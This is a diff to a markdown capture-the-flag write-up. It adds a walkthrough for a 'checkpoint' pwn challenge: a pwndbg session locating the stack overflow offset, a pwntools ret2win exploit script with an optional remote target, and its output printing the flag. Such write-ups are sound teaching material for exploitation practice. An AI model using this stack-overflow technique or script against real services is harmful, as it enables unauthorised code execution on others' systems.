@@ -218,6 +218,8 @@ skid@TheGreen:~/ctfs/new$
 
 **Try it yourself binary is there its self explaned..**
 
+---
+
 **2nd one**:  [download](https://github.com/TheGreenOfficial/pwn-archive/blob/main/pwn-archive/binaries/checkpoint.zip)
 
 **first look of binary**
@@ -302,8 +304,138 @@ skid@TheGreen:~/ctfs/new/pwn$ pwn checksec ./checkpoint
 skid@TheGreen:~/ctfs/new/pwn$
 ```
 
-**No PIE gud.. lets write exploit for this ret2win..**
+**No PIE gud.. let's find out  write exploit for this ret2win..**
 
+```
+skid@TheGreen:~/ctfs/new/pwn$ gdb ./checkpoint
+GNU gdb (Debian 17.2-1+b1) 17.2
+Copyright (C) 2025 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+pwndbg: loaded 200 pwndbg commands. Type pwndbg [filter] for a list.
+pwndbg: created 12 GDB functions (can be used with print/break). Type help function to see them.
+Reading symbols from ./checkpoint...
+Use the errno (or errno <number>) command to see the name of the last or provided (libc) error
+pwndbg> r < <(pwn cyclic 100)
+Starting program: /home/skid/ctfs/new/pwn/checkpoint < <(pwn cyclic 100)
+⚠️ warning: Expected absolute pathname for libpthread in the inferior, but got ./libc.so.6.
+⚠️ warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.
+=== Sparrow Freight border checkpoint ===
+State your name for the log:
+Access denied, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa�. Turn back.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000401301 in checkpoint ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+──────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────
+ RAX  0x82
+ RBX  0x7fffffffdd38 —▸ 0x7fffffffe01b ◂— '/home/skid/ctfs/new/pwn/checkpoint'
+ RCX  0
+ RDX  0
+ RDI  0x7fffffffd9e0 —▸ 0x7fffffffda10 ◂— 0x6420737365630a2e ('.\ncess d')
+ RSI  0x7fffffffda10 ◂— 0x6420737365630a2e ('.\ncess d')
+ R8   2
+ R9   0
+ R10  0xffffffff
+ R11  0x202
+ R12  1
+ R13  0
+ R14  0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011e0 (__do_global_dtors_aux) ◂— endbr64
+ R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
+ RBP  0x6161617261616171 ('qaaaraaa')
+ RSP  0x7fffffffdc08 ◂— 0x6161617461616173 ('saaataaa')
+ RIP  0x401301 (checkpoint+93) ◂— ret
+───────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────
+ ► 0x401301 <checkpoint+93>    ret                                <0x6161617461616173>
+    ↓
+
+
+
+
+
+
+
+
+
+────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fffffffdc08 ◂— 0x6161617461616173 ('saaataaa')
+01:0008│     0x7fffffffdc10 ◂— 0x6161617661616175 ('uaaavaaa')
+02:0010│     0x7fffffffdc18 ◂— 0x6161617861616177 ('waaaxaaa')
+03:0018│     0x7fffffffdc20 ◂— 0x7fff61616179
+04:0020│     0x7fffffffdc28 —▸ 0x7fffffffdd38 —▸ 0x7fffffffe01b ◂— '/home/skid/ctfs/new/pwn/checkpoint'
+05:0028│     0x7fffffffdc30 ◂— 0x1003fe040
+06:0030│     0x7fffffffdc38 —▸ 0x401302 (main) ◂— endbr64
+07:0038│     0x7fffffffdc40 —▸ 0x7fffffffdd38 —▸ 0x7fffffffe01b ◂— '/home/skid/ctfs/new/pwn/checkpoint'
+──────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0 0x401301           checkpoint+93
+   1 0x6161617461616173
+   2 0x6161617661616175
+   3 0x6161617861616177
+   4 0x7fff61616179
+   5 0x7fffffffdd38
+   6 0x1003fe040
+   7 0x401302           main
+─────────────────────────────────────────────────────────────────────────────────────────────────[ LAST SIGNAL ]──────────────────────────────────────────────────────────────────────────────────────────────────
+Program received signal SIGSEGV (fault address: 0x0).
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> quit
+skid@TheGreen:~/ctfs/new/pwn$ pwn cyclic -l qaaar
+64
+skid@TheGreen:~/ctfs/new/pwn$
 ```
 
 ```
+#!/usr/bin/env python3
+import sys
+from pwn import *
+
+if len(sys.argv) == 3:
+    ip = sys.argv[1]
+    port = int(sys.argv[2])
+    print(f"[*] Connecting to remote target -> {ip}:{port}")
+    p = remote(ip, port)
+else:
+    print("[*] Running local binary process...")
+    p = process('./checkpoint')
+
+p.recvuntil(b'log:')
+
+payload = b'A' * 72
+payload += p64(0x00401216)
+
+p.sendline(payload)
+
+p.interactive()
+```
+
+**Running exploit to get flag..**
+
+```
+skid@TheGreen:~/ctfs/new/pwn$ python3 e.py
+[*] Running local binary process...
+[+] Starting local process './checkpoint': pid 1792
+[*] Switching to interactive mode
+
+Access denied, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x16\x12@. Turn back.
+ACCESS GRANTED: flag{congruletion}
+
+[*] Got EOF while reading in interactive
+$ exit
+[*] Process './checkpoint' stopped with exit code -11 (SIGSEGV) (pid 1792)
+[*] Got EOF while sending in interactive
+skid@TheGreen:~/ctfs/new/pwn$
+```
+
+---
+
